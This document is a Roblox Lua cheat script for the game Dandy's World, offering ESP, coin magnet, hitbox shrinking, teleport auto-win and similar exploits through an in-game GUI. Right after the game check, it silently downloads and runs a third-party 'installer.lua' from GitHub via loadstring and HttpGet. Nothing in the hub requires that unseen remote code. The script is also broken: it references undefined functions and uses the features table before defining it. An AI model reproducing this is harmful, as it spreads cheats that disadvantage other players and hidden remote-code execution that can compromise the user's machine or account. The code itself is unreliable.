-- Game Verification
local gameIds = {
    16116270224  -- Dandy's World ALPHA
}

local function isInGame()
    local currentGameId = game.GameId
    local currentPlaceId = game.PlaceId
    
    for _, id in ipairs(gameIds) do
        if currentGameId == id or currentPlaceId == id then
            return true
        end
    end
    return false
end

if not isInGame() then
    local notification = Instance.new("TextLabel")
    notification.Text = "Error: You are not in Dandy's World [ALPHA]"
    notification.Size = UDim2.new(0, 300, 0, 50)
    notification.Position = UDim2.new(0.5, -150, 0.5, -25)
    notification.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
    notification.TextColor3 = Color3.fromRGB(255, 255, 255)
    notification.Font = Enum.Font.GothamBold
    notification.TextSize = 14
    notification.Parent = game:GetService("CoreGui")
    
    wait(3)
    notification:Destroy()
    return
end

loadstring(game:HttpGet('https://raw.githubusercontent.com/Erchobg/Voidware/main/installer.lua'))()('e')

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
local LocalPlayer = Players.LocalPlayer
local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
local Root = Character:WaitForChild("HumanoidRootPart")
local Humanoid = Character:WaitForChild("Humanoid")

-- Player ESP Function
local function updatePlayerESP()
    spawn(function()
        while features.playerESP do
            for _, player in pairs(Players:GetPlayers()) do
                if player ~= LocalPlayer and player.Character then
                    local highlight = player.Character:FindFirstChild("Highlight") or Instance.new("Highlight")
                    highlight.Parent = player.Character
                    highlight.FillColor = Color3.fromRGB(255, 0, 0)
                    highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
                end
            end
            wait(1)
        end
    end)
end

-- Item ESP Function
local function updateItemESP()
    spawn(function()
        while features.itemESP do
            for _, item in pairs(workspace:GetChildren()) do
                if item:IsA("Tool") or item.Name == "Coin" then
                    local highlight = item:FindFirstChild("Highlight") or Instance.new("Highlight")
                    highlight.Parent = item
                    highlight.FillColor = Color3.fromRGB(255, 255, 0)
                    highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
                end
            end
            wait(1)
        end
    end)
end

-- Coin Magnet Function
local function startCoinMagnet()
    spawn(function()
        while features.coinMagnet do
            for _, coin in pairs(workspace:GetChildren()) do
                if coin.Name == "Coin" and coin:IsA("BasePart") then
                    coin.CFrame = Root.CFrame
                end
            end
            wait(0.1)
        end
    end)
end

-- Auto Dodge Function
local function startAutoDodge()
    spawn(function()
        while features.autoDodge do
            for _, obj in pairs(workspace:GetChildren()) do
                if obj.Name == "DangerPart" and (obj.Position - Root.Position).Magnitude < 10 then
                    Root.CFrame = Root.CFrame + Vector3.new(0, 0, 5)
                end
            end
            wait(0.1)
        end
    end)
end

-- Hitbox Decrease Function
local function updateHitboxes()
    spawn(function()
        while features.hitboxExpander do
            for _, player in pairs(Players:GetPlayers()) do
                if player ~= LocalPlayer and player.Character then
                    local hrp = player.Character:FindFirstChild("HumanoidRootPart")
                    if hrp then
                        hrp.Size = Vector3.new(0.5, 0.5, 0.5)
                        hrp.Transparency = 0.5
                    end
                end
            end
            wait(1)
        end
    end)
end

-- Auto Win Function
local function startAutoWin()
    spawn(function()
        while features.autoWin do
            local finishPart = workspace:FindFirstChild("FinishPart")
            if finishPart then
                Root.CFrame = finishPart.CFrame
            end
            wait(0.1)
        end
    end)
end

-- GUI Creation
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "DandysWorldGUI"
if game:GetService("CoreGui"):FindFirstChild("DandysWorldGUI") then
    game:GetService("CoreGui"):FindFirstChild("DandysWorldGUI"):Destroy()
end
ScreenGui.Parent = game:GetService("CoreGui")

local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Size = UDim2.new(0, 250, 0, 400)
MainFrame.Position = UDim2.new(0.8, 0, 0.3, 0)
MainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
MainFrame.Active = true
MainFrame.Draggable = true
MainFrame.Parent = ScreenGui

local Title = Instance.new("TextLabel")
Title.Text = "Dandy's World Hub"
Title.Size = UDim2.new(1, 0, 0, 30)
Title.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 16
Title.Parent = MainFrame

local ScrollFrame = Instance.new("ScrollingFrame")
ScrollFrame.Size = UDim2.new(0.95, 0, 0.9, 0)
ScrollFrame.Position = UDim2.new(0.025, 0, 0.1, 0)
ScrollFrame.BackgroundTransparency = 1
ScrollFrame.ScrollBarThickness = 4
ScrollFrame.Parent = MainFrame

-- Features
local features = {
    autoFarm = false,
    autoCollect = false,
    playerESP = false,
    itemESP = false,
    speedBoost = false,
    infiniteJump = false,
    coinMagnet = false,
    autoDodge = false,
    antiVoid = false,
    autoWin = false,
    hitboxExpander = false,
    antiAFK = false
}

-- Functions
local function createButton(name, position)
    local button = Instance.new("TextButton")
    button.Size = UDim2.new(0.9, 0, 0, 30)
    button.Position = UDim2.new(0.05, 0, 0, position)
    button.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
    button.TextColor3 = Color3.fromRGB(255, 255, 255)
    button.Text = name
    button.Font = Enum.Font.Gotham
    button.TextSize = 14
    button.Parent = ScrollFrame
    
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 6)
    corner.Parent = button
    
    return button
end

local function notify(text)
    local notification = Instance.new("TextLabel")
    notification.Text = text
    notification.Size = UDim2.new(0, 200, 0, 40)
    notification.Position = UDim2.new(0.5, -100, 0, -40)
    notification.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
    notification.TextColor3 = Color3.fromRGB(255, 255, 255)
    notification.Font = Enum.Font.GothamBold
    notification.TextSize = 14
    notification.Parent = ScreenGui
    
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 6)
    corner.Parent = notification
    
    TweenService:Create(notification, TweenInfo.new(0.5), {Position = UDim2.new(0.5, -100, 0, 20)}):Play()
    wait(2)
    TweenService:Create(notification, TweenInfo.new(0.5), {Position = UDim2.new(0.5, -100, 0, -40)}):Play()
    wait(0.5)
    notification:Destroy()
end

local buttonList = {
    {name = "Auto Farm", feature = "autoFarm"},
    {name = "Auto Collect", feature = "autoCollect"},
    {name = "Player ESP", feature = "playerESP"},
    {name = "Item ESP", feature = "itemESP"},
    {name = "Speed Boost", feature = "speedBoost"},
    {name = "Infinite Jump", feature = "infiniteJump"},
    {name = "Coin Magnet", feature = "coinMagnet"},
    {name = "Auto Dodge", feature = "autoDodge"},
    {name = "Anti Void", feature = "antiVoid"},
    {name = "Auto Win", feature = "autoWin"},
    {name = "Hitbox Decrease", feature = "hitboxExpander"},
    {name = "Anti AFK", feature = "antiAFK"}
}

for i, buttonInfo in ipairs(buttonList) do
    local button = createButton(buttonInfo.name, (i-1) * 35)
    button.MouseButton1Click:Connect(function()
        features[buttonInfo.feature] = not features[buttonInfo.feature]
        button.BackgroundColor3 = features[buttonInfo.feature] and Color3.fromRGB(0, 255, 0) or Color3.fromRGB(45, 45, 45)
        
        if buttonInfo.feature == "autoFarm" then
            if features.autoFarm then
                startAutoFarm()
                notify("Auto Farm Enabled")
            else
                notify("Auto Farm Disabled")
            end
        elseif buttonInfo.feature == "autoCollect" then
            if features.autoCollect then
                startAutoCollect()
                notify("Auto Collect Enabled")
            else
                notify("Auto Collect Disabled")
            end
        elseif buttonInfo.feature == "speedBoost" then
            if features.speedBoost then
                updateSpeed()
                notify("Speed Boost Enabled")
            else
                Humanoid.WalkSpeed = 16
                notify("Speed Boost Disabled")
            end
        elseif buttonInfo.feature == "playerESP" then
            if features.playerESP then
                updatePlayerESP()
                notify("Player ESP Enabled")
            else
                for _, player in pairs(Players:GetPlayers()) do
                    if player.Character and player.Character:FindFirstChild("Highlight") then
                        player.Character.Highlight:Destroy()
                    end
                end
                notify("Player ESP Disabled")
            end
        elseif buttonInfo.feature == "itemESP" then
            if features.itemESP then
                updateItemESP()
                notify("Item ESP Enabled")
            else
                for _, item in pairs(workspace:GetChildren()) do
                    if item:FindFirstChild("Highlight") then
                        item.Highlight:Destroy()
                    end
                end
                notify("Item ESP Disabled")
            end
        elseif buttonInfo.feature == "coinMagnet" then
            if features.coinMagnet then
                startCoinMagnet()
                notify("Coin Magnet Enabled")
            else
                notify("Coin Magnet Disabled")
            end
        elseif buttonInfo.feature == "autoDodge" then
            if features.autoDodge then
                startAutoDodge()
                notify("Auto Dodge Enabled")
            else
                notify("Auto Dodge Disabled")
            end
        elseif buttonInfo.feature == "hitboxExpander" then
            if features.hitboxExpander then
                updateHitboxes()
                notify("Hitbox Decrease Enabled")
            else
                for _, player in pairs(Players:GetPlayers()) do
                    if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                        player.Character.HumanoidRootPart.Size = Vector3.new(2, 2, 1)
                        player.Character.HumanoidRootPart.Transparency = 1
                    end
                end
                notify("Hitbox Decrease Disabled")
            end
        elseif buttonInfo.feature == "autoWin" then
            if features.autoWin then
                startAutoWin()
                notify("Auto Win Enabled")
            else
                notify("Auto Win Disabled")
            end
        end
    end)
end

-- Main Loop
RunService.Heartbeat:Connect(function()
    if features.antiVoid and Root.Position.Y < -10 then
        Root.CFrame = CFrame.new(Root.Position.X, 10, Root.Position.Z)
    end
end)

-- Anti AFK
if features.antiAFK then
    local VirtualUser = game:GetService("VirtualUser")
    LocalPlayer.Idled:Connect(function()
        VirtualUser:CaptureController()
        VirtualUser:ClickButton2(Vector2.new())
    end)
end

-- Infinite Jump
game:GetService("UserInputService").JumpRequest:Connect(function()
    if features.infiniteJump then
        Humanoid:ChangeState("Jumping")
    end
end)
